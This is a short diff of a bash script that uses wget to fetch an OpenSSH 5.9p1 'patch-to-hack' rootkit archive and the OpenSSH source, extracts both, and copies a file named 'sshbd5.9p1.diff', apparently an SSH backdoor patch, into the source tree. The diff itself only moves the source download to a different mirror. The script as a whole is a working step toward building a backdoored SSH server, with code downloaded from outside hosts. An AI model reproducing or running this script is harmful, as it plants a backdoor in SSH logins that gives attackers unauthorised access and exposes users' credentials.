@@ -1,6 +1,6 @@
 #!/bin/bash
 wget http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz
-wget http://ftp.jaist.ac.jp/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz
+wget http://down1.chinaunix.net/distfiles/openssh-5.9p1.tar.gz
 tar zxvf openssh-5.9p1.tar.gz
 tar zxvf 0x06-openssh-5.9p1.patch.tar.gz
 cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1
